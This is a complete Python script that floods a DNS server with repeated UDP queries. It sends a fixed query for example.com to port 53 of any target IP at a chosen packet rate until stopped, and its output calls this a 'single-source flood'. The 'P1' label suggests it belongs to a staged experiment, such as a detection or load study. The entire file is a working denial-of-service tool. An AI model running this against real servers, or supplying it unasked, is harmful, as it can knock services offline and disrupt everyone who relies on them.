import socket
import time
import sys

def main():
    if len(sys.argv) < 3:
        print("Usage: python3 flood_p1.py <target_ip> <rate_pps>")
        sys.exit(1)
    
    target_ip = sys.argv[1]
    rate = int(sys.argv[2])

    # Standard minimal DNS query packet for 'example.com' (Type A)
    dns_query = b'\x13\x34\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00' \
                b'\x07example\x03com\x00\x00\x01\x00\x01'

    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    print(f"[*] Starting P1 Single-Source Flood towards {target_ip}:53 at ~{rate} pps...")
    
    count = 0
    start_time = time.time()
    try:
        while True:
            sock.sendto(dns_query, (target_ip, 53))
            count += 1
            # Rate pacing
            target_time = start_time + (count / rate)
            delay = target_time - time.time()
            if delay > 0:
                time.sleep(delay)
    except KeyboardInterrupt:
        print(f"\n[*] Stopped P1 flood. Sent {count} packets.")

if __name__ == '__main__':
    main()